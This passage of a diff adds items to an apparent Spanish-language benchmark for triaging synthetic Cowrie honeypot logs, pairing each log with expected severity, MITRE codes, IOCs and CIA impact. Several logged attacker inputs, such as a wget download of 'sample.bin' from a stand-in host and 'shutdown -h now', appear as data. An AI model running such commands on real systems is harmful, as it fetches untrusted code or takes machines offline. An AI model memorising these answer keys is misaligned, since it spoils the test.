+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO02",
+          "potencial": "moderado"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E21",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_proxy",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.login.success",
+          "username": "fixture-account",
+          "password": "Fixture-21-P",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "uname -a",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 3,
+          "timestamp": "2026-11-24T12:00:03+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "wget https://updates.eval.local/sample.bin",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "intento"
+        },
+        {
+          "evento": 3,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        },
+        {
+          "tipo": "URL",
+          "valor": "https://updates.eval.local/sample.bin"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1082",
+          "eventos": [
+            2
+          ]
+        },
+        {
+          "codigo": "T1105",
+          "eventos": [
+            3
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S2",
+        "justificacion": "Se distinguen autenticación en el señuelo, descubrimiento y solicitud de transferencia."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "bajo"
+        },
+        "integridad": {
+          "observado": "IO02",
+          "potencial": "moderado"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2,
+          3
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E22",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "shutdown -h now",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [
+        {
+          "codigo": "T1529",
+          "eventos": [
+            1
+          ]
+        }
+      ],
+      "severidad_esperada": {
+        "nivel": "S3",
+        "justificacion": "Solicitud explícita de apagar el sistema. La salida de servicio no está probada."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO02",
+          "potencial": "alto"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E23",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "dig assets.eval.local",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        },
+        {
+          "tipo": "Dominio",
+          "valor": "assets.eval.local"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Consulta DNS sin evidencia suficiente de descubrimiento remoto ATT&CK."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E24",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_proxy",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.session.connect",
+          "protocol": "ssh",
+          "src_ip": "198.51.100.43"
+        },
+        {
+          "id_evento": 2,
+          "timestamp": "2026-11-24T12:00:02+00:00",
+          "eventid": "fixture.external.effect",
+          "source": "telemetria_simulada_verificada",
+          "result": "indisponibilidad confirmada del activo crítico de laboratorio",
+          "reference": "OBS-24 y CANARY-24",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "registrado"
+        },
+        {
+          "evento": 2,
+          "estado": "efecto_verificado"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S4",
+        "justificacion": "El oráculo de laboratorio confirma la indisponibilidad del activo crítico. Cowrie solo es una de las fuentes."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO01",
+          "potencial": "alto"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1,
+          2
+        ],
+        "alcance": "Dos comprobaciones de laboratorio simuladas desde fuera de Cowrie."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": true
+    },
+    {
+      "id": "E25",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_llm",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "uname -a",
+          "realm": "control"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "no_determinable"
+        }
+      ],
+      "iocs_esperados": [],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "No evaluable",
+        "justificacion": "Entrada de un canal de control sin evidencia de comando del actor."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO04",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    },
+    {
+      "id": "E26",
+      "particion": "evaluacion",
+      "modalidad": "cowrie_shell",
+      "eventos": [
+        {
+          "id_evento": 1,
+          "timestamp": "2026-11-24T12:00:01+00:00",
+          "eventid": "cowrie.command.input",
+          "input": "date",
+          "src_ip": "198.51.100.43"
+        }
+      ],
+      "acciones_esperadas": [
+        {
+          "evento": 1,
+          "estado": "intento"
+        }
+      ],
+      "iocs_esperados": [
+        {
+          "tipo": "IP",
+          "valor": "198.51.100.43"
+        }
+      ],
+      "mitre_esperadas": [],
+      "severidad_esperada": {
+        "nivel": "S1",
+        "justificacion": "Consulta benigna de fecha que muestra interacción. No hay una técnica ATT&CK ni efecto acreditado."
+      },
+      "cia_esperado": {
+        "confidencialidad": {
+          "observado": "IO02",
+          "potencial": "no_evaluable"
+        },
+        "integridad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        },
+        "disponibilidad": {
+          "observado": "IO05",
+          "potencial": "no_evaluable"
+        }
+      },
+      "evidencia_de_referencia": {
+        "eventos": [
+          1
+        ],
+        "alcance": "Lectura de registros sintéticos. La entrada de un comando solo acredita la solicitud."
+      },
+      "no_afirmar": [
+        "ejecucion_confirmada",
+        "organizacion_evaluada",
+        "impacto_externo_confirmado",
+        "resultado_transferencia_senuelo"
+      ],
+      "requiere_corroboracion_externa": false
+    }
+  ]
+}
